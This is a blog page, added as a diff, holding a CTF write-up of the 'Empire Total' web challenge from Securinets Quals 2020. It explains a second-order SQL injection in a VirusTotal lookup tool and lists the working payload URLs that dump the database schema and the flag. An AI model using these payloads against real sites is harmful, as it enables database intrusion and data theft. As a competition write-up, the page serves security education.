@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Source Themes Academic 4.8.0">
+
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="Belkahla Ahmed">
+
+  
+  
+  
+    
+  
+  <meta name="description" content="Writeup for the web exploitation task Empire Total in Securinets Quals 2020.">
+
+  
+  <link rel="alternate" hreflang="en-us" href="https://kahla-sec.github.io/post/empire-total-securinetsquals20/">
+
+  
+
+
+  
+  
+  
+  <meta name="theme-color" content="rgb(0, 136, 204)">
+  
+
+  
+  
+
+  
+  
+  
+  
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.min.css" integrity="sha256-4w9DunooKSr3MFXHXWyFER38WmPdm361bQS/2KUWZbU=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/github.min.css" crossorigin="anonymous" title="hl-light" disabled>
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark">
+        
+      
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.css" integrity="sha256-SHMGCYmST46SoyGgo4YR/9AlK1vf3ff84Aq9yK4hdqM=" crossorigin="anonymous">
+    
+
+    
+
+    
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js" integrity="sha256-Md1qLToewPeKjfAHU1zyPwOutccPAm5tahnaw7Osw0A=" crossorigin="anonymous" async></script>
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+        
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CRoboto:400,400italic,700%7CRoboto+Mono&display=swap">
+  
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/academic.css">
+
+  
+
+
+
+
+  
+
+
+  
+  <link rel="alternate" href="/post/empire-total-securinetsquals20/index.xml" type="application/rss+xml" title="Kahla">
+  
+
+  <link rel="manifest" href="/index.webmanifest">
+  <link rel="icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_2.png">
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png">
+
+  <link rel="canonical" href="https://kahla-sec.github.io/post/empire-total-securinetsquals20/">
+
+  
+  
+  
+  
+  
+    
+  
+  
+  <meta property="twitter:card" content="summary_large_image">
+  
+  <meta property="twitter:site" content="@BelkahlaAhmed1">
+  <meta property="twitter:creator" content="@BelkahlaAhmed1">
+  
+  <meta property="og:site_name" content="Kahla">
+  <meta property="og:url" content="https://kahla-sec.github.io/post/empire-total-securinetsquals20/">
+  <meta property="og:title" content="Empire Total - Securinets Quals20 | Kahla">
+  <meta property="og:description" content="Writeup for the web exploitation task Empire Total in Securinets Quals 2020."><meta property="og:image" content="https://kahla-sec.github.io/img/quals.jpg">
+  <meta property="twitter:image" content="https://kahla-sec.github.io/img/quals.jpg"><meta property="og:locale" content="en-us">
+  
+    <meta property="og:updated_time" content="2020-03-21T00:00:00&#43;00:00">
+  
+
+  
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+  <title>Empire Total - Securinets Quals20 | Kahla</title>
+
+</head>
+
+<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="dark">
+
+  <aside class="search-results" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" spellcheck="false" type="search">
+        
+      </div>
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+  
+
+
+
+
+
+
+
+<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
+  <div class="container">
+
+    
+    <div class="d-none d-lg-inline-flex">
+      <a class="navbar-brand" href="/">Kahla</a>
+    </div>
+    
+
+    
+    <button type="button" class="navbar-toggler" data-toggle="collapse"
+            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span><i class="fas fa-bars"></i></span>
+    </button>
+    
+
+    
+    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
+      <a class="navbar-brand" href="/">Kahla</a>
+    </div>
+    
+
+    
+    
+    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
+
+      
+      <ul class="navbar-nav d-md-inline-flex">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#posts"><span>Posts</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#projects"><span>Projects</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#contact"><span>Contact</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/files/cv.pdf"><span>CV</span></a>
+        </li>
+
+        
+        
+
+      
+
+        
+      </ul>
+    </div>
+
+    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
+      
+      <li class="nav-item">
+        <a class="nav-link js-search" href="#"><i class="fas fa-search" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+      <li class="nav-item dropdown theme-dropdown">
+        <a href="#" class="nav-link js-theme-selector" data-toggle="dropdown" aria-haspopup="true">
+          <i class="fas fa-palette" aria-hidden="true"></i>
+        </a>
+        <div class="dropdown-menu">
+          <a href="#" class="dropdown-item js-set-theme-light">
+            <span>Light</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-dark">
+            <span>Dark</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-auto">
+            <span>Automatic</span>
+          </a>
+        </div>
+      </li>
+      
+
+      
+
+    </ul>
+
+  </div>
+</nav>
+
+
+  
+
+
+
+
+
+
+
+
+
+<div class="article-header">
+  
+  
+  <img src="/img/quals.jpg" class="article-banner" alt="">
+  
+
+  <span class="article-header-caption">Empire Total</span>
+</div>
+
+
+
+
+  
+
+  
+  
+  
+    
+  
+<div class="universal-wrapper pt-3">
+  <h1>Empire Total - Securinets Quals20</h1>
+
+  
+
+  
+</div>
+
+
+
+<div class="universal-wrapper">
+
+  
+  <div class="article-style"><h1 id="empire-total-1000pts-7-solves-"><strong>Empire Total (1000pts) (7 Solves)</strong></h1>
+<p><img src="https://imgur.com/rGcoI7o.png" alt="TASK"></p>
+<p>This task was really so creative and i had so fun solving it , but i can&rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let&rsquo;s download it and begin our trip xD</p>
+<p>After Visiting the website we find a tool based on Virus Total API , understanding the functionality of the website is really necessary for solving the task, we will cover it in details later, but as a first thought we give an ip address to the website and it will shows Virus Total stats about it</p>
+<p><img src="https://imgur.com/k7ScCjX.png" alt="TASK"></p>
+<p><img src="https://imgur.com/bjRXPJT.png" alt="TASK"></p>
+<p>After cloning the project here is its structure</p>
+<blockquote>
+<p>git clone <a href="https://github.com/mohamedaymenkarmous/virustotal-api-html">https://github.com/mohamedaymenkarmous/virustotal-api-html</a></p>
+</blockquote>
+<p><img src="https://imgur.com/alxzV41.png" alt="TASK"></p>
+<p>let&rsquo;s take a look at index.php , since the code is really too long i will only put the important parts, as we can see after some configurations and Recaptcha setting, all the SQL queries are prepared statements so there is no way to perform SQL injection but we can notice the execution of the
+<strong>shell_exec</strong> function :D Interesting hmmm</p>
+<p><img src="https://imgur.com/A1kiMAa.png" alt="TASK"></p>
+<p><strong>shell_exec</strong> is executing some python script with a scanned ip argument ,maybe manipulating it will give us something useful</p>
+<pre><code class="language-php">$command = &quot;../VirusTotal.py '$scanned_ip'&quot;;
+$output = shell_exec($command);
+</code></pre>
+<p>But unfortunately there&rsquo;s too much restriction on our input :( it&rsquo;s impossible to bypass the filter_var here and the JS restrictions (if you can bpass it just tell me xD )</p>
+<pre><code class="language-php"> if(isset($_POST) &amp;&amp; !empty($_POST)){
+  $scanned_ip=isset($_POST['ip']) &amp;&amp; !empty($_POST['ip'])  &amp;&amp; !is_array($_POST['ip']) ? $_POST['ip'] : &quot;&quot;;
+  if(!$scanned_ip){header(&quot;Location: /?invalid_ip&quot;);exit();}
+  if (filter_var($scanned_ip, FILTER_VALIDATE_IP)) {
+  } else {header(&quot;Location: /?invalid_ip&quot;);exit();}
+</code></pre>
+<p>Let&rsquo;s proceed , it seems that the index.php is pretty safe ,let&rsquo;s take a look at the VirusTotal.py script</p>
+<p><img src="https://imgur.com/ytcYYQQ.png" alt="TASK"></p>
+<p>OMG :'( 499 lines , that was so discouraging @Emperors :( but we needed that flag to have the 10th place xD anyway after scrolling around and reading the code , we can somehow understand the behaviour of the website,
+when we enter the ip address it asks the Virus Total API for the results and then there&rsquo;s the persistence functionality that saves the results in the database and then when we enter the same ip address again it will loads
+the results from the database .</p>
+<p>So if we can control the results maybe we will have the opportunity to perform an SQL injection ? I got stuck in this part for a long time and after the help of the admin ( Thank you @Emperors &lt;3 ) i found something interesting :D</p>
+<p>before we proceed here&rsquo;s a vulnerable function to SQL injection that saves the results of urls section in the database (line 417 in VirusTotal.py)</p>
+<pre><code class="language-python">  def persistURLs(self,selected_ips,ip_report_filtered):
+    attr=&quot;detected_urls&quot;
+    table_name=&quot;vt_scanned_urls_table&quot;
+    newAttr=self.AttrSubstitution[attr] if attr in self.AttrSubstitution else attr
+    selected_urls=self.findPersistedIP(selected_ips[0]['id'],table_name)
+    selected_urls_filtered=[]
+    for selected_url in selected_urls:
+      selected_urls_filtered.append(selected_url['url'])
+    if newAttr in ip_report_filtered:
+     for url in ip_report_filtered[newAttr]:
+      print(url['URL'])
+      if url['URL'] not in selected_urls_filtered:
+        try:
+          self.CursorRW.execute(&quot;INSERT INTO &quot;+table_name+&quot; (ip_id,url,detections,scanned_time) VALUES ('&quot;+str(selected_ips[0]['id'])+&quot;','&quot;+url['URL']+&quot;','&quot;+url['Detections']+&quot;','&quot;+url['Scanned']+&quot;')&quot;)
+          self.DBRW.commit()
+          self.resetSQL()
+        except Exception as e:
+          print(&quot;INSERT INTO &quot;+table_name+&quot; (ip_id,url,detections,scanned_time) VALUES ('&quot;+str(selected_ips[0]['id'])+&quot;','&quot;+url['URL']+&quot;','&quot;+url['Detections']+&quot;','&quot;+url['Scanned']+&quot;')&quot;)
+          print(&quot;EXCEPTION: &quot;,e)
+          self.resetSQL()
+</code></pre>
+<h2 id="exploitation-">Exploitation</h2>
+<p>So the idea is that if we go to VirusTotal website (<a href="https://www.virustotal.com/">https://www.virustotal.com/</a>) and scan a url ,and then go back to our challenge website and scan the url&rsquo;s ip
+we will find that the url we scanned in VirusTotal website will appear , it&rsquo;s pretty confusing i know so let&rsquo;s have an example</p>
+<ol>
+<li>We go to Virus Total website and scan for any url for example :( in my case i launched a web server on my VPS and used it here )</li>
+</ol>
+<blockquote>
+<p>http://100.26.206.184/?u=Just testing for the writeup :p</p>
+</blockquote>
+<p><img src="https://imgur.com/mGOQ1tQ.png" alt="TASK"></p>
+<ol start="2">
+<li>Now we go back to the challenge website and scan the ip address</li>
+</ol>
+<p><img src="https://i.imgur.com/N7ymSRT.jpg" alt="TASK"></p>
+<p>Yeeees ! it&rsquo;s appearing in the results so we now have the control over these values in the urls section of the results.</p>
+<p>Now here is our scenario , if we look to the vulnerable function <strong>persistURLs</strong> in VirusTotal.py we can notice the injection in this query (line 430)</p>
+<blockquote>
+<p>INSERT INTO &ldquo;+table_name+&rdquo; (ip_id,url,detections,scanned_time) VALUES ('&ldquo;+str(selected_ips[0][&lsquo;id&rsquo;])+&rdquo;','&ldquo;+url[&lsquo;URL&rsquo;]+&rdquo;','&ldquo;+url[&lsquo;Detections&rsquo;]+&rdquo;','&ldquo;+url[&lsquo;Scanned&rsquo;]+&rdquo;')</p>
+</blockquote>
+<p>We have control over the <strong>url[&lsquo;URL&rsquo;]</strong> parameter (the url we scan in VirusTotal Website) so it&rsquo;s now an SQL injection in INSERT INTO values, but we have some constraints :</p>
+<ol>
+<li>The url encoding <strong>%20</strong> that will be interpreted with the SQL query so we have to find another way in our payload instead of white spaces which is a well known bypass:  <strong>/**/</strong></li>
+<li>The second thing faced me when i was solving the challenge , we can&rsquo;t use <strong>&ndash; -</strong> to equilibrate the SQL query so we will have to find a solution to equilibrate it</li>
+</ol>
+<p>In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it <strong>
+<a href="https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/Empire%20Total/test.py" target="_blank" rel="noopener">HERE</a></strong></p>
+<p>Finally I opted to this solution, here is the URL we will scan :</p>
+<blockquote>
+<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/1),(select/</strong>/2)),(&lsquo;102&rsquo;,&lsquo;a</p>
+</blockquote>
+<p>The complete SQL query that will be executed is  :</p>
+<blockquote>
+<p>INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES (&lsquo;2&rsquo;,&lsquo;100.26.206.184/?u=&rsquo;,(select 1),(select 2)),(&lsquo;102&rsquo;,&lsquo;a&rsquo;,&lsquo;15&rsquo;,&lsquo;yes&rsquo;)</p>
+</blockquote>
+<p>Let&rsquo;s try it now , we first scan it in VirusTotal :</p>
+<p><img src="https://imgur.com/3L7lmrs.png" alt="TASK"></p>
+<p>And now let&rsquo;s scan the IP in the challenge website  :</p>
+<p><img src="https://imgur.com/f2CRd7H.png" alt="TASK"></p>
+<p>It&rsquo;s fetched successfully, let&rsquo;s scan the ip another time now to check if our injection succeeded or not, we must see 1,2 in the output :</p>
+<p><img src="https://i.imgur.com/U3SEcaV.jpg" alt="TASK"></p>
+<p>Bingo ! our injection worked , we only have to dump the entire Database now and repeat the same procedure:</p>
+<ol>
+<li>Dump DB names :</li>
+</ol>
+<blockquote>
+<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/gRoUp_cOncaT(0x7c,schema_name,0x7c)/</strong>/fRoM/<strong>/information_schema.schemata),(select/</strong>/2)),(&lsquo;102&rsquo;,&lsquo;a</p>
+</blockquote>
+<p><img src="https://imgur.com/AJvdMXB.png" alt="TASK"></p>
+<p>DBName : MySecretDatabase</p>
+<ol start="2">
+<li>Dump Tables and Columns :</li>
+</ol>
+<blockquote>
+<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/gRoUp_cOncaT(0x7c,table_name,0x7c)/</strong>/fRoM/<strong>/information_schema.tables),(select/</strong>/2)),(&lsquo;102&rsquo;,&lsquo;a</p>
+</blockquote>
+<blockquote>
+<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/gRoUp_cOncaT(0x7c,column_name,0x7c)/</strong>/fRoM/<strong>/information_schema.columns),(select/</strong>/2)),(&lsquo;103&rsquo;,&lsquo;a</p>
+</blockquote>
+<p><img src="https://imgur.com/raYuUmI.png" alt="TASK"></p>
+<p><strong>Table Name</strong> : SecretTable &amp; <strong>Column Name</strong> : secret_value</p>
+<ol start="3">
+<li>And finally let&rsquo;s have our beloved flag :</li>
+</ol>
+<blockquote>
+<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/group_concat(0x7c,secret_value,0x7c)/</strong>/fRoM/<strong>/MySecretDatabase.SecretTable),(select/</strong>/2)),(&lsquo;109&rsquo;,&lsquo;a</p>
+</blockquote>
+<p><img src="https://imgur.com/FanWbUZ.png" alt="TASK"></p>
+<p>Yees We did it , <strong>FLAG</strong> : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}</p>
+<p>I have really liked the idea of the challenge, it&rsquo;s really creative , i want to thank Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.</p>
+<p>I hope you liked the writeup if you have any questions don&rsquo;t hesitate to contact me <strong>Twitter</strong> : @BelkahlaAhmed1 , finally i can sleep in peace after these 24 hours xd</p>
+</div>
+  
+
+  
+  
+
+  
+
+
+</div>
+
+      
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js" integrity="sha256-eOgo0OtLL4cdq7RdwRUiGKLX9XsIJ7nGhWEKbohmVAQ=" crossorigin="anonymous"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/languages/r.min.js"></script>
+        
+      
+
+    
+
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js" integrity="sha256-EErZamuLefUnbMBQbsEqu1USa+btR2oIlCpBJbyD4/g=" crossorigin="anonymous"></script>
+    
+
+    
+    
+    <script>const code_highlighting = true;</script>
+    
+
+    
+    
+    <script>const isSiteThemeDark = true;</script>
+    
+
+    
+    
+    
+    
+    
+    
+    <script>
+      const search_config = {"indexURI":"/index.json","minLength":1,"threshold":0.3};
+      const i18n = {"no_results":"No results found","placeholder":"Search...","results":"results found"};
+      const content_type = {
+        'post': "Posts",
+        'project': "Projects",
+        'publication' : "Publications",
+        'talk' : "Talks"
+        };
+    </script>
+    
+
+    
+    
+
+    
+    
+    <script id="search-hit-fuse-template" type="text/x-template">
+      <div class="search-hit" id="summary-{{key}}">
+      <div class="search-hit-content">
+        <div class="search-hit-name">
+          <a href="{{relpermalink}}">{{title}}</a>
+          <div class="article-metadata search-hit-type">{{type}}</div>
+          <p class="search-hit-description">{{snippet}}</p>
+        </div>
+      </div>
+      </div>
+    </script>
+    
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+    
+    <script src="/js/academic.min.37431be2d92d7fb0160054761ab79602.js"></script>
+
+    
+
+
+
+
+
+
+  
+  
+  <div class="container">
+    <footer class="site-footer">
+  
+
+  <p class="powered-by">
+    © Ahmed Belkahla, 2020 &middot; 
+
+    Powered by the
+    <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
+    <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a>.
+
+    
+    <span class="float-right" aria-hidden="true">
+      <a href="#" class="back-to-top">
+        <span class="button_icon">
+          <i class="fas fa-chevron-up fa-2x"></i>
+        </span>
+      </a>
+    </span>
+    
+  </p>
+</footer>
+
+  </div>
+  
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
